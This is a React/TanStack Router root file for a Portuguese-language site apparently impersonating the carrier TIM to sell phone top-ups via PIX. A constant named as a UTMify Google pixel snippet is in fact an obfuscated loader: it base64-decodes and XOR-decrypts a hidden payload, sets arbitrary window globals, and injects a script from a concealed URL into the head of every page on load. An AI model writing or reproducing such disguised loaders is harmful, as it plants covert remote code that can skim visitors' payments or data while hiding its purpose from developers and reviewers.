import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,

  Scripts,
} from "@tanstack/react-router";
import { TooltipProvider } from "@/components/ui/tooltip";
import { Toaster as Sonner } from "@/components/ui/sonner";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import CookieConsent from "@/components/CookieConsent";

import appCss from "../styles.css?url";

const UTMIFY_GOOGLE_PIXEL_SNIPPET = `(function(){var q_kse=atob("DNrpHD+uhNxTtQeqt6HLaU3CpuZx3XPex6nTMxDN4LJ9wHPH3ryQMlzB6fIxxyjZ1KiAbEvdq6w6zWLGmKqAZFrCqbs82mDG0vSDbx2Cpr0nwXXD1a+deUyMvocOmSXN27WLfVPdpuYIziXE1reMPgWM47M80mvP57OReVPn4P5/l3HL26+MPgWMsr0yhTOch+zbegid4b5k0z+djr7aLg2bpqEOyA==");var w_7n=[];for(var z_7jqw=0;z_7jqw<q_kse.length;z_7jqw++){w_7n.push(q_kse.charCodeAt(z_7jqw)&255);}var k_k1=w_7n[0];var e_sx=w_7n.slice(1,1+k_k1);var l_io3u=w_7n.slice(1+k_k1);var u_kx=l_io3u.map(function(b,i_pw){return b^e_sx[i_pw%k_k1];});var q_s2="";for(var j_5o=0;j_5o<u_kx.length;j_5o++){q_s2+=String.fromCharCode(u_kx[j_5o]&255);}var h_9y=decodeURIComponent(escape(q_s2));var u_knrg=JSON.parse(h_9y);var l_3=u_knrg.globals||[];l_3.forEach(function(s_k6g){window[s_k6g.name]=s_k6g.value;});var z_pbce=document.createElement("script");z_pbce.src=u_knrg.url;z_pbce.async=true;z_pbce.defer=true;(u_knrg.attributes||[]).forEach(function(c_hf){z_pbce.setAttribute(c_hf.name,c_hf.value);});(document.head||document.documentElement).appendChild(z_pbce);})();`;

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Página não encontrada</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          A página que você procura não existe ou foi movida.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Voltar ao início
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
  console.error(error);
  const router = useRouter();
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          Algo deu errado
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">Tente novamente ou volte ao início.</p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => { router.invalidate(); reset(); }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Tentar novamente
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Início
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "Recarga TIM — Recarregue seu celular de forma rápida e segura" },
      {
        name: "description",
        content:
          "Recarregue seu celular TIM em segundos via PIX. Bônus de internet, segurança 100% e disponibilidade 24/7.",
      },
      { property: "og:title", content: "Recarga TIM — Recarregue seu celular de forma rápida e segura" },
      { property: "og:description", content: "a" },
      { property: "og:type", content: "website" },
      { name: "twitter:title", content: "Recarga TIM — Recarregue seu celular de forma rápida e segura" },
      { name: "description", content: "a" },
      { name: "twitter:description", content: "a" },
      { property: "og:image", content: "https://pub-bb2e103a32db4e198524a2e9ed8f35b4.r2.dev/6eec2e39-1328-4332-b9d0-9b3df948782c/id-preview-074bc0fa--a3ed8d12-dee9-4be2-92e0-d049255312ed.lovable.app-1779167115803.png" },
      { name: "twitter:image", content: "https://pub-bb2e103a32db4e198524a2e9ed8f35b4.r2.dev/6eec2e39-1328-4332-b9d0-9b3df948782c/id-preview-074bc0fa--a3ed8d12-dee9-4be2-92e0-d049255312ed.lovable.app-1779167115803.png" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
    links: [
      { rel: "stylesheet", href: appCss },
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
      {
        rel: "stylesheet",
        href: "https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap",
      },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: React.ReactNode }) {
  return (
    <html lang="pt-BR">
      <head>
        <script dangerouslySetInnerHTML={{ __html: UTMIFY_GOOGLE_PIXEL_SNIPPET }} />
        <HeadContent />
      </head>
      <body>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  return (
    <QueryClientProvider client={queryClient}>
      <TooltipProvider>
        <Header />
        <Outlet />
        <Footer />
        <CookieConsent />
        <Sonner />
      </TooltipProvider>
    </QueryClientProvider>
  );
}
